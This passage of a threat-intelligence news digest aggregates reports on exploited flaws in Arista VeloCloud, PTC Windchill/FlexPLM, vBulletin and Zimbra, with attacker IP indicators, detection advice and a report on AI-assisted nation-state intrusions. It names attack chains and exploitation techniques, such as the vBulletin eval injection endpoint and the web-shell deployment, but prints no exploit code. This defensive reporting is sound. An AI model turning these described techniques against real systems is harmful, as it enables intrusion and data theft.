- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-16812
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Arista has patched a maximum-severity command injection vulnerability in on-premises VeloCloud Orchestrator deployments that is being actively exploited in attacks. [...]
```

#### Full body

```
Arista patches VeloCloud Orchestrator zero-day exploited in attacks By Lawrence Abrams July 27, 2026 06:49 PM 0 Arista has patched a maximum-severity command injection vulnerability in on-premises VeloCloud Orchestrator deployments that is being actively exploited in attacks. The vulnerability, tracked as CVE-2026-16812, is an unauthenticated OS command injection flaw with severity scores of 10.0, the maximum score that can be given to flaws. VeloCloud Orchestrator, also known as VCO, is a centralized management platform used to configure, monitor, and manage VeloCloud SD-WAN deployments and associated edge devices. According to an Arista security advisory published Monday, the vulnerability allows remote attackers to access privileged functionality that was intended only for internal use and should not be remotely accessible. "Successful exploitation may compromise the confidentiality, integrity, and availability of the orchestrator and data managed by the orchestrator," Arista warned . The company says VCO is supposed to be exposed by default, with no configuration option that can prevent this exposure. Attackers only require network access to the VCO web interface, and no VCO tenant or operator credentials are needed to exploit the flaw. Arista says CVE-2026-16812 was discovered externally and is known to be actively exploited, but has not shared when the attacks began, who is behind them, or how the vulnerability is being exploited. BleepingComputer has contacted the company with these questions. The following VeloCloud Orchestrator on-premises versions are affected: VCO 5.2.x releases before 5.2.3.14 VCO 6.1.x releases before 6.1.3.4 VCO 6.4.x releases before 6.4.2.4 VCO 7.0.x releases before 7.0.0.1 VeloCloud Orchestrator Hosted and Dedicated deployments were patched before the advisory was published and are not affected. VeloCloud Gateway and VeloCloud Edge products are also not vulnerable to the flaw. The company says the flaw is fixed in VCO versions 5.2.3.14, 6.1.3.4, and 6.4.2.4 and later. The affected software list also indicates that VCO 7.0.0.1 and later releases are not vulnerable. Arista warns that end-of-support software versions have not been assessed to determine if they are vulnerable. Customers running unsupported release trains are advised to contact the Arista Technical Assistance Center to discuss available upgrade options. The U.S. Cybersecurity and Infrastructure Security Agency has also added CVE-2026-16812 to its Known Exploited Vulnerabilities catalog, confirming that the flaw is being used in attacks. CISA has ordered U.S. federal civilian executive branch agencies to mitigate the vulnerability by Thursday, July 30, 2026, as required by Binding Operational Directive 22-01. Indicators of compromise While patches are being deployed, administrators should restrict access to the VCO web interface to administrative networks, monitor for connections from known malicious IP addresses, and review recent administrator activity for unusual changes. Arista shared three IP addresses that were seen exploiting the vulnerability: 8.19.75.217 206.72.242.124 206.72.242.162 Administrators are advised to block these IP addresses and review their logs for previous connections. However, it is possible that devices could have been compromised from other IPs, so this list is not definitive. Organizations should review VCO logs for signs of exploitation, including: Unusual web requests containing encoded characters, URL-like path components, references to local or internal services, or abnormally high request rates Connections from known malicious IP addresses Unexpected outbound HTTP or HTTPS traffic from the VCO host Unauthorized configuration changes or privileged maintenance activity Unexpected command execution, file creation, database exports, or archive files Suspicious access to VCO databases, configuration data, device inventories, credentials, certificates, or cryptographic keys If compromise is suspected, orga
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Arista patches VeloCloud Orchestrator zero-day exploited in attacks
  - Published: 2026-07-27T22:49:44+00:00
  - Link: https://www.bleepingcomputer.com/news/security/arista-patches-velocloud-orchestrator-zero-day-exploited-in-attacks/
  - Summary: Arista has patched a maximum-severity command injection vulnerability in on-premises VeloCloud Orchestrator deployments that is being actively exploited in attacks. [...]

### Cluster 06319fc0de — score 17

- Title: TrendAI™ Reports Nation-State Activity in H1 2026 APT Activity Roundup
- Source: Trend Micro Research (threat_research_primary)
- Published: 2026-07-29T13:00:00+00:00
- Link: https://newsroom.trendmicro.com/2026-07-29-TrendAI-TM-Reports-Nation-State-Activity-in-H1-2026-APT-Activity-Roundup
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain, zero_day
- affected_industries: government
- affected_products: Ivanti
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day, apt_espionage
- affected_industries: government
- affected_products: Ivanti
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Full body

```
arrow_back search close Newsroom Media Coverage Global Press Releases Local Press Releases Stay connected with press releases from Trend teams in your region. Media Contacts Investor Relations TrendAI™ Reports Nation-State Activity in H1 2026 APT Activity Roundup Generative AI is now sharpening nation-state exploits and powering autonomous reconnaissance, mid-year findings show DALLAS , July 29, 2026 / PRNewswire / -- TrendAI™, the global AI security leader and enterprise business unit of Trend Micro Incorporated (TYO: 4704; TSE: 4704), today released its H1 2026 APT Activity Roundup. The mid-year findings on the H1 2026 threat landscape showed that AI has moved beyond isolated experiments. Nation states used AI in more stages of the intrusion lifecycle than any other prior half TrendAI™ has tracked. Between January and June 2026, TrendAI™ detected the following APT (advanced persistent threat) nation-state activity: China-aligned threat actors used generative AI to sharpen exploits and iteratively build malware through vibe coding. One AI agent independently ran its own reconnaissance and lateral movement inside a target network. Russia-aligned Pawn Storm opened the year with an Office zero-day vulnerability and kept pressing Ukraine and its partners across government, defense, and wartime-aid organizations. DPRK-aligned actors folded commercial AI into their operations and poisoned a widely used software package to reach downstream developers. Iran-aligned Earth Vetala scanned for a newly disclosed Ivanti vulnerability within days of its release, and other Iran-aligned actors carried out hands-on attacks against internet-exposed operational technology, tampering with fuel-tank gauges at sites in the United States. Robert McArdle, Director of Cybercrime Research at TrendAI ™ : "Artificial intelligence has stopped being a side tool for attackers and has become a teammate embedded in the operation itself. We are watching nation-state actors hand reconnaissance and lateral movement to an AI agent, and use generative models to iterate on malware the way a developer ships code. Defenders now have to assume the adversary on the other end of an intrusion may not be a person typing commands, but a system executing a plan." Key findings include: AI now touches more stages of the intrusion lifecycle, from exploit development to autonomous reconnaissance and lateral movement Known and zero-day vulnerabilities are weaponized within days of disclosure, and the software supply chain remains a favored entry point Operational technology and physical-world targets — including fuel-tank monitoring systems — are back in attackers' crosshairs A newer tracking method, ADINT, harvests location and device data from online ad auctions without deploying any malware Threat actors increasingly hide command-and-control on trusted cloud platforms, developer tunnels, blockchains, and paste sites Malware-as-a-service and shared tooling make attribution harder, even as nation-state motives remain durable through year end To read a full copy of the report, visit our website . About TrendAI™ TrendAI™ , the global AI security leader and enterprise business unit of Trend Micro , empowers organizations with full AI visibility and consolidated security that inspires confidence, drives innovation, and eliminates risk. Trusted by the largest enterprises and governments across 185 countries, TrendAI™ secures the entire organization, from identities to infrastructure to data. AI Fearlessly. trendaisecurity.com SOURCE TrendAI For further information: For further information: Trend Micro Communications, media_relations@trendmicro.com Try our services free for 30 days Start your free trial today LinkedIn Facebook Twitter Instagram YouTube Resources Blog Newsroom Threat Reports Find a Partner Support Business Support Portal Contact Us Downloads Free Trials About Trend About us Careers Locations Upcoming Events Trust Center Select a country / region United States Close Me
```

#### Corroborating sources (1)

- **Trend Micro Research** (threat_research_primary)
  - Title: TrendAI™ Reports Nation-State Activity in H1 2026 APT Activity Roundup
  - Published: 2026-07-29T13:00:00+00:00
  - Link: https://newsroom.trendmicro.com/2026-07-29-TrendAI-TM-Reports-Nation-State-Activity-in-H1-2026-APT-Activity-Roundup

### Cluster efa5d95ebc — score 17

- Title: Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-25T10:14:03+00:00
- Link: https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, vulnerability_disclosure, web_shell_backdoor
- actor_attribution: Cl0p
- affected_industries: aviation_defense, manufacturing_industrial, retail_ecommerce
- affected_products: AWS, Microsoft SharePoint, OpenAI/ChatGPT
- cve_ids: CVE-2026-12569, CVE-2026-50522
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach, web_shell_backdoor, vulnerability_disclosure
- actor_attribution: Cl0p
- affected_industries: manufacturing_industrial, aviation_defense, retail_ecommerce
- affected_products: Microsoft SharePoint, OpenAI/ChatGPT, AWS
- cve_ids: CVE-2026-12569, CVE-2026-50522
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. "Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling
```

#### Full body

```
Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE  Ravie Lakshmanan  Jul 25, 2026 Vulnerability / Ransomware Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. "Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling unauthenticated remote code execution and deployment of hex-named JSP web shells under /Windchill/login/," according to a new coordinated advisory released by Ransom-ISAC along with eCrime.ch and DEFUSED. Upon gaining an initial foothold, the attackers have been found to conduct file system enumeration, stage engineering/design data, and ultimately carry out double extortion data theft. Targets of the campaign include manufacturing, automotive, aerospace, and retail sectors. It's suspected that threat actors are exploiting CVE-2026-12569 (CVSS score: 9.3), a critical security flaw in PTC Windmill that was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) Known Exploited Vulnerabilities (KEV) catalog late last month. In an advisory, PTC warned customers that it had "received continued reports of heightened threat activity," adding that unknown attackers are exploiting the vulnerability to deploy JSP web shells against susceptible systems. "In the observed intrusions, this RCE is chained with a separate pre-authentication information-disclosure defect in the FlexPLM WSDL endpoint (CVSS v3.1 7.5) to enable unauthenticated exploitation," researchers Brandon Parsons, Corsin Camichel, and Simo Kohonen said. Ransom-ISAC has shared four IP addresses as indicators of compromise (IoCs), all of which match those shared by PTC - 216.152.148.54 216.152.151.204 104.243.35.63 5.180.41.35 The extortion emails appear to originate from previously compromised accounts and are sent to hundreds of users within an impacted organization, along with ways to contact the Cl0p ransomware crew. In a separate post on X, ReliaQuest said it observed threat actors actively exploiting CVE-2026-12569 to facilitate "unauthenticated remote code execution and JSP web shell deployment for remote command execution and sensitive product data exfiltration." "The actor behind these attacks remains unconfirmed. However, the observed tradecraft shares characteristics with previous Cl0p campaigns targeting enterprise applications and high-value data repositories," it added . The Cl0p gang has a storied history of going after security flaws in widely-used enterprise products to break into target organizations for data theft and extortion attacks. Previous campaigns mounted by the group have weaponized file transfer appliances , including those from Accellion FTA, GoAnywhere MFT, SolarWinds Serv-U FTP, Cleo, and MOVEit Transfer, as well as a vulnerability in Oracle E-Business Suite . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cyber Attack , Cyber Crime , data breach , enterprise security , Malware , ransomware , remote code execution , Threat Intelligence , Vulnerability , Vulnerability Management ⚡ Top Stories This Week New Bit2Watt Attack Could Let Cloud Tenants Disrupt Power Grids Without an Exploit Open-Source Android AI Agents Could Let Invisible Screen Text Run Code on Host PCs Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC AWS Kiro Flaw Let a Poisoned Web Page Rewrite Its Config and Run Code Apple Fixes Hide My Email Bug That Exposed Real Addresses in Mail Logs Microsoft Azure DevOps MCP Flaw Lets Hidden PR Comments Hijack AI Review Agents OpenAI Says Its AI Models Escaped Sandbox, Targeted Hugging Face to Cheat Benchmark Adobe Acrobat Extensio
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cl0p Affiliates Target Internet-Exposed PTC Windchill and FlexPLM with Unauthenticated RCE
  - Published: 2026-07-25T10:14:03+00:00
  - Link: https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html
  - Summary: Threat actors linked to the Cl0p (aka Chubby Scorpius, FIN11, Graceful Spider, and Lace Tempest) ransomware campaign are exploiting flaws in internet-exposed PTC Windmill and FlexPLM deployments as part of a new data extortion campaign. "Attackers chain a pre-authentication information disclosure in the FlexPLM WSDL endpoint with a server-side flaw in the Windchill login servlet, enabling

### Cluster 07328bc0d0 — score 15

- Title: What’s new in Gemini Enterprise Agent Platform
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-07-29T16:00:00+00:00
- Link: https://cloud.google.com/blog/products/ai-machine-learning/whats-new-in-gemini-enterprise-agent-platform/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, credential_theft, zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft, zero_day, ai_security
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Since we launched Gemini Enterprise Agent Platform a few months ago, we’ve seen inspiring progress from businesses and builders alike. To stir up development, we’ve also shared 13 demos that can walk you through the versatility and power of Agent Platform, and 20 questions you can ask your teams about building a solid agentic foundation. Meanwhile at Google Cloud, our teams have been hard at work to make more features available and continue delivering on our promise to give you better ways to simply and securely scale your agents. That’s why today, we are announcing some of our most popular capabilities are available for everyone, from Agent Runtime to Agent Identity. We also recently just announced CodeMender , our new managed code security agent to help you advance from passive scanning to automated code remediation, and reduce zero-day risk. Read on to learn more. Automate your long-running agents faster and with better memory Think about your long-running agentic workflows. Maybe i
```

#### Full body

```
AI & Machine Learning What’s new in Gemini Enterprise Agent Platform July 29, 2026 Mike Clark Director of Product Management, Gemini Enterprise Agent Platform Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now Since we launched Gemini Enterprise Agent Platform a few months ago, we’ve seen inspiring progress from businesses and builders alike. To stir up development, we’ve also shared 13 demos that can walk you through the versatility and power of Agent Platform, and 20 questions you can ask your teams about building a solid agentic foundation. Meanwhile at Google Cloud, our teams have been hard at work to make more features available and continue delivering on our promise to give you better ways to simply and securely scale your agents. That’s why today, we are announcing some of our most popular capabilities are available for everyone, from Agent Runtime to Agent Identity. We also recently just announced CodeMender , our new managed code security agent to help you advance from passive scanning to automated code remediation, and reduce zero-day risk. Read on to learn more. Automate your long-running agents faster and with better memory Think about your long-running agentic workflows. Maybe it’s managing a sales prospecting sequence, continuously monitoring vendor supply chains for compliance risks, or orchestrating IT incident response and root-cause patching across your infrastructure. If you want to move past a basic chat function, you’ll need the stamina to execute multi-step agents over time, and the contextual memory to keep the experience personal and relevant. To help you get there, we’re bringing these capabilities to everyone: Agent Memory Bank: Enable low-latency agent personalization by defining structured schemas that automatically extract and maintain critical conversation context for maximum efficiency. This ensures your agents retain key user preferences, past decisions, and account history across long-running tasks, allowing them to pick up right where they left off without losing context or slowing down response times. Agent Runtime: Automate complex, multi-day agents and reasoning tasks with agents capable of running continuously for up to 7 days. This means you can delegate entire asynchronous processes, like executing a week-long sales sequence or orchestrating a multi-stage onboarding process — letting agents make decisions in the background without requiring constant human intervention or lost context. Secure, audit, and centralize your agent operations Once you run an agent with a solid memory and dependable runtime, you have to make sure it’s safe and secure. Especially for enterprise work, security must be embedded across all your work, no matter the workflow or human behind it. To help your team work safely, we’re making three features available to help you secure, audit, and centralize your agents. Agent Identity: A new native IAM type built on open standards that enforces a least-privilege approach to agent permissions. It mitigates token theft by binding access directly to the agent runtime, provides non-repudiable auditing of all agent actions, and automatically manages the identity lifecycle to eliminate dormant credentials. Agent Gateway: This gives you a central control point where you can secure and govern all interactions across your agent ecosystem. From this point, you can enforce granular access controls through IAM conditions and natural language rules, while integrated inline protection with Model Armor safeguards against prompt injection, tool poisoning, and data leakage. Agent Registry: We want to give power to every individual to build agents, and we need a single glass pane view of all agents built across the organization. Agent Registry is that view. It serves as a single library for all the AI agents, servers, and connections across your organization. It allows teams to easily find and reuse agents rather than building them from scratch, keep
```

#### Corroborating sources (1)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: What’s new in Gemini Enterprise Agent Platform
  - Published: 2026-07-29T16:00:00+00:00
  - Link: https://cloud.google.com/blog/products/ai-machine-learning/whats-new-in-gemini-enterprise-agent-platform/
  - Summary: Since we launched Gemini Enterprise Agent Platform a few months ago, we’ve seen inspiring progress from businesses and builders alike. To stir up development, we’ve also shared 13 demos that can walk you through the versatility and power of Agent Platform, and 20 questions you can ask your teams about building a solid agentic foundation. Meanwhile at Google Cloud, our teams have been hard at work to make more features available and continue delivering on our promise to give you better ways to simply and securely scale your agents. That’s why today, we are announcing some of our most popular capabilities are available for everyone, from Agent Runtime to Agent Identity. We also recently just announced CodeMender , our new managed code security agent to help you advance from passive scanning to automated code remediation, and reduce zero-day risk. Read on to learn more. Automate your long-running agents faster and with better memory Think about your long-running agentic workflows. Maybe i

### Cluster 55ab649ea4 — score 15

- Title: vBulletin fixes critical pre-auth RCE flaw with public exploit
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-28T18:08:50+00:00
- Link: https://www.bleepingcomputer.com/news/security/vbulletin-fixes-critical-pre-auth-rce-flaw-with-public-exploit/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Microsoft SharePoint
- cve_ids: CVE-2026-61511
- urgency_signals: actively_exploited, no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Microsoft SharePoint
- cve_ids: CVE-2026-61511
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical vulnerability in the vBulletin forum software allows unauthenticated attackers to execute arbitrary PHP code through template rendering. [...]
```

#### Full body

```
vBulletin fixes critical pre-auth RCE flaw with public exploit By Bill Toulas July 28, 2026 02:08 PM 0 A critical vulnerability in the vBulletin forum software allows unauthenticated attackers to execute arbitrary PHP code through template rendering. The security issue is tracked as CVE-2026-61511 and affects vBulletin versions in the 5.x and 6.x branches up to 5.7.5 and 6.2.1, respectively. vBulletin is a PHP-based proprietary forum platform released in 2000 and used by large online communities, gaming sites, support portals, automotive forums, tech forums, and discussion boards. Although the platform has lost popularity over the years to newer, more modern solutions, it still retains a significant market share. Independent security researcher Egidio Romano discovered the flaw and reported it through the SSD Secure Disclosure advisory program and published a technical write-up . According to Romano, the flaw is caused by the ‘runMaths()’ function, which doesn’t properly sanitize user input before passing it to PHP's eval() function, which should be limited to mathematical expressions only. The researcher found that unauthenticated attackers can exploit the flaw by sending a specially crafted request to the 'ajax/render/[template]' endpoint. The request is processed by a vulnerable template, like 'pagenav', that ultimately passes attacker-controlled input to PHP's eval() function, resulting in remote code execution. SSD Secure Disclosure has also published a technical analysis for CVE-2026-61511, explaining that the sanitization restrictions can be bypassed using the so-called “phpfuck” technique . The researchers also published a proof-of-concept (PoC) exploit targeting the ajax/render/pagenav route and executing arbitrary system commands on vulnerable servers. The availability of a public PoC for CVE-2026-61511 lowers the barrier for attackers and typically leads to increased scanning and exploitation attempts against unpatched internet-facing vBulletin servers. This was highlighted in May 2025, when threat actors used public PoCs for two critical vBulletin flaws, also discovered by Romano, to target unpatched instances . CVE-2026-61511 was reported to vBulletin on June 25, 2026, and version 6.2.2, which addressed the flaw, was released on July 1 . Security patches were backported to earlier releases, tagged as ‘Patch Level 1,’ including for v6.2.1, v6.2.0, and v.6.1.6. Wayne Luke, vBulletin’s technical support lead, stated on the project’s forums that users of older versions should upgrade to a newer release, so it can be deduced that there will be no updates to address CVE-2026-61511 in the 5.x branch. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Critical Langflow RCE flaw exploited to hack AI app servers Disgruntled researcher leaks “BlueHammer” Windows zero-day exploit Hackers target US firms in FastJson RCE zero-day attacks CISA orders urgent action on actively exploited Langflow RCE flaw Critical SharePoint RCE flaw exploited to steal machine keys
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: vBulletin fixes critical pre-auth RCE flaw with public exploit
  - Published: 2026-07-28T18:08:50+00:00
  - Link: https://www.bleepingcomputer.com/news/security/vbulletin-fixes-critical-pre-auth-rce-flaw-with-public-exploit/
  - Summary: A critical vulnerability in the vBulletin forum software allows unauthenticated attackers to execute arbitrary PHP code through template rendering. [...]

### Cluster 304bd4a378 — score 15

- Title: Attackers Exploit Arista VeloCloud Orchestrator Command Injection Flaw
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-28T04:43:53+00:00
- Link: https://thehackernews.com/2026/07/attackers-exploit-arista-velocloud.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-16812

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Fortinet
- cve_ids: CVE-2025-68686, CVE-2026-16723, CVE-2026-16812
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: government
- affected_products: Fortinet
- cve_ids: CVE-2026-16812, CVE-2025-68686, CVE-2026-16723
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A maximum-severity security flaw impacting on-premises versions of Arista VeloCloud Orchestrator (VCO) has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-16812 (CVSS score: 10.0), is a case of operating system command injection that could pave the way for arbitrary code execution. "VeloCloud Orchestrator (VCO) on-prem has a security issue where this issue
```

#### Full body

```
Attackers Exploit Arista VeloCloud Orchestrator Command Injection Flaw  Ravie Lakshmanan  Jul 28, 2026 Vulnerability / Threat Intelligence A maximum-severity security flaw impacting on-premises versions of Arista VeloCloud Orchestrator (VCO) has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-16812 (CVSS score: 10.0), is a case of operating system command injection that could pave the way for arbitrary code execution. "VeloCloud Orchestrator (VCO) on-prem has a security issue where this issue may allow a remote attacker to access privileged internal functionality and impact the VCO host," Arista said in a Monday advisory. "Successful exploitation may compromise the confidentiality, integrity, and availability of the orchestrator and data managed by the orchestrator. This functionality was intended to be for internal use only and is not intended to be remotely accessible." The American network equipment company said the issue has already been addressed in hosted and dedicated versions of VCO in advance. The following versions are affected - VCO 5.2.x releases prior to 5.2.3.14 VCO 6.1.x releases prior to 6.1.3.4 VCO 6.4.x releases prior to 6.4.2.4 VCO 7.0.x releases prior to 7.0.0.1 Arista acknowledged that the vulnerability was externally discovered and known to be actively exploited, but did not reveal when it was disclosed and how many customers may have been potentially impacted as part of malicious cyber activity weaponizing the bug. As indicators of compromise (IoCs), the company shared a set of three IP addresses that it said were responsible for "conducting the attacks," urging customers to block them and review the logs to determine if they are present - 8.19.75.217 206.72.242.124 206.72.242.162 "If compromise is suspected, operators should preserve VCO web access logs, backend application logs, system logs, database logs, and relevant file-system timestamps before remediation where operationally feasible," it added. If immediate updating to a fixed VCO release is not an option, it's recommended to restrict access to the VCO web interface to trusted administrative networks, monitor the VCO for access from known malicious source IPs, check for unexpected outbound network activity from the VCO host, and review recent administrator activity for unexpected changes. "Compromises to the VCO platform may allow attackers access to the VeloCloud Edge devices as well," Arista said. "This may include credential rotation, review of administrator activity, validation of managed device state, and restoration or replacement of affected orchestrator instances from trusted sources." The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add the flaw to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patch by July 30, 2026. News of active exploitation of CVE-2026-16812 arrives as the agency also added a medium-severity security vulnerability impacting Fortinet FortiOS SSL-VPN (CVE-2025-68686, CVSS score: 5.3) to the KEV catalog, citing evidence of active exploitation. The shortcoming was patched by Fortinet earlier this February. "An exposure of sensitive information to an unauthorized actor vulnerability [CWE-200] in FortiOS SSL-VPN may allow a remote unauthenticated attacker to bypass the patch developed for the symbolic link persistency mechanism observed in some post-exploit cases, via crafted HTTP requests," Fortinet said in an alert at the time. "An attacker would need first to have compromised the product via another vulnerability, at the file system level." There are currently no details on how the vulnerability is being exploited in the wild, the scale of attacks, and who is behind them. Federal agencies have time till August 10, 2026, to apply the patches. Another security flaw that has come under attack is CVE-2026-16723 (CVSS score: 9.0), a critical issue in Alibaba's Fa
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Arista VeloCloud Orchestrator Command Injection Flaw
  - Published: 2026-07-28T04:43:53+00:00
  - Link: https://thehackernews.com/2026/07/attackers-exploit-arista-velocloud.html
  - Summary: A maximum-severity security flaw impacting on-premises versions of Arista VeloCloud Orchestrator (VCO) has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-16812 (CVSS score: 10.0), is a case of operating system command injection that could pave the way for arbitrary code execution. "VeloCloud Orchestrator (VCO) on-prem has a security issue where this issue

### Cluster 51bbe21d6c — score 14

- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-23T16:13:08+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- actor_attribution: APT28
- affected_industries: financial_services, government, manufacturing_industrial
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage
- actor_attribution: APT28
- affected_industries: financial_services, government, manufacturing_industrial
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
Image: Le Vu via Unsplash International alert spotlights Russia-linked attacks on Zimbra webmail Russian state-aligned hackers have been compromising governmental and commercial organizations throughout the West through zero-click phishing emails, federal agencies in the U.S., U.K., Europe, Australia and New Zealand warned on Thursday. The campaign, carried out by the advanced persistent threat (APT) group Laundry Bear, targets Zimbra Collaboration Suite’s webmail platform and exploits a vulnerability that was patched in November 2025. According to the advisory , the hackers carried out “extensive” targeting of Ukrainian entities before training their sights on U.S. and NATO organizations — evidence of “an increasing trend within Russian cyber threat groups to target Ukrainian users first—both as a priority target and as a testbench for malicious cyber techniques before broader global deployment.” “The covert and persistent nature of this activity, along with the absence of any known financial extortion, almost certainly indicates this group’s involvement in espionage activities with Russian government backing,” the agencies concluded. Palo Alto Networks’ Unit 42, which also published a report Thursday on the campaign, said the hackers targeted the defense and transportation sectors, as well as financial organizations in NATO member states, Ukraine, Commonwealth of Independent States countries and Africa. In its own advisory , Proofpoint said the group had compromised “government, high science, and defense industrial base targets in the United States.” Laundry Bear was first identified in May 2025 by Dutch intelligence agencies, which blamed the group for a series of hacks in the Netherlands, including on the national police. According to Microsoft, it has been active since at least 2024. Previous campaigns involved “unsophisticated” techniques, like password spraying and phishing attempts that required a recipient to click on a link. Since at least July 2025, the group has been deploying a novel exploit against the CVE-2025-66376 vulnerability in which a malicious JavaScript payload is hidden in emails sent from previously compromised email accounts. The payload is executed immediately when the emails are opened. According to the advisory, the hackers have attempted to exfiltrate the last 90 days of emails from a compromised account, passwords, contact lists, two-factor authentication tokens and other passcodes. In March 2026, the cybersecurity firm Seqrite described a zero-click phishing campaign exploiting Zimbra webmail that compromised a Ukrainian maritime agency . They attributed the activity with medium confidence to the Russian APT known as Fancy Bear. Dutch intelligence said Laundry Bear’s tactics “overlap with the modus operandi” of Fancy Bear but that they are different actors. Proofpoint researchers said the campaign reflects other activity in recent years from Russian and Belarusian hackers using cross-site scripting exploits “to pillage webmail servers.” The government agencies implored organizations using the Zimbra webmail service to immediately patch their software and, if patching is not feasible, to direct employees to use a different mail client. Nation-state News Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
  - Published: 2026-07-23T16:13:08+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes

### Cluster 2675bb2bb6 — score 14

- Title: Secure your npm and pip package updates in Amazon Linux
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-07-29T14:53:39+00:00
- Link: https://aws.amazon.com/blogs/security/secure-your-npm-and-pip-package-updates-in-amazon-linux/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: PyPI, npm
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

